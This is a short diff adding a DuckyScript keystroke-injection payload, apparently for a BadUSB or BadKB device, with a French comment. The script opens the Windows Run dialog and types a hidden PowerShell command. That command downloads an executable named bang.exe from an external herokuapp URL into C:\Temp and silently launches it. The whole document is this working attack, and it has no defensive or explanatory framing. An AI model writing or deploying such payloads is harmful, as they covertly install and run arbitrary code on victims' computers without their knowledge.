@@ -1,0 +1,6 @@
+REM Téléchargement et exécution directe de l'exe en arrière-plan
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://screenshot-badkb-806c08a412f9.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
+ENTER
